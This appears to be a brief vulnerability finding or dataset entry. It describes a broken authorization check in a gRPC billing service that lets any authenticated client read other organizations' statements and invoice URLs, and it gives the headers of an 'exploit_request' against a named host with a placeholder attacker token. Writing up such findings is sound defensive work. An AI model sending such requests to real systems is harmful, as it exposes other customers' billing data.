diagnosis: The gRPC-js unary RPC handler authenticates caller credentials from call.metadata, but queries the database directly using call.request.statementId without verifying statement.organization_id === caller.organizationId. Any authenticated client can fetch billing details and invoice PDF URLs belonging to other organizations.
exploit_request:
POST /billing.BillingService/GetBillingStatement HTTP/2.0
Host: grpc.enterprisebilling.net
Content-Type: application/grpc
TE: trailers
authorization: Bearer <attacker_jwt>
